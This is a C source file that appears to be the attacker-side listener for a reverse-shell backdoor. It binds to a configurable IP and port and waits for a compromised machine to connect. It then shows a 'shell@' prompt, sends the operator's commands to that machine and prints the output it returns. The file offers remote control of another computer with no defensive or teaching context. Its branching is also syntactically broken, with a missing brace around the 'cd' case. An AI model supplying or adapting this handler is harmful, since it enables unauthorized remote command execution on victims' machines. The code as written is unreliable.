#include <stdio.h>      
#include <stdlib.h>   
#include <unistd.h>    
#include <sys/types.h>	
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <string.h>     
#include <arpa/inet.h>	

//set host IP Address and Port [EDIT HERE]

char *ServIP = "192.168.56.8";
unsigned short ServPort = 6500;


int main()
{
	int sock, client_socket; 
	char buffer[1024]; 
	char response[18384];

    //Structure for server adresses 
	struct sockaddr_in server_address, client_address;

	int optval = 1;
	socklen_t client_length;

	//define socket object
	sock = socket(AF_INET, SOCK_STREAM, 0);

	//socket setup error tests
	if (setsockopt (sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		printf("Error Setting TCP Socket Options!\n");
		return 1;
	}

	//setup server address
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr(ServIP); //set host IP
	server_address.sin_port = htons(ServPort); //set port

	//bind socket
	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 5);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length); 

	while(1)
	{
		//bzero doesn't need predefinition in linux
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));

		printf("* shell@%s:~$ ", inet_ntoa(client_address.sin_addr)); 
		fgets(buffer, sizeof(buffer), stdin); 
		strtok(buffer, "\n");
		write(client_socket, buffer, sizeof(buffer)); 

		//quit server with q command
		if (strncmp("q", buffer, 1) == 0)
		{
			break;
		}
        else if( strncmp("cd ", buffer, 3) == 0){
            goto jump;
		
		else
		{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}
}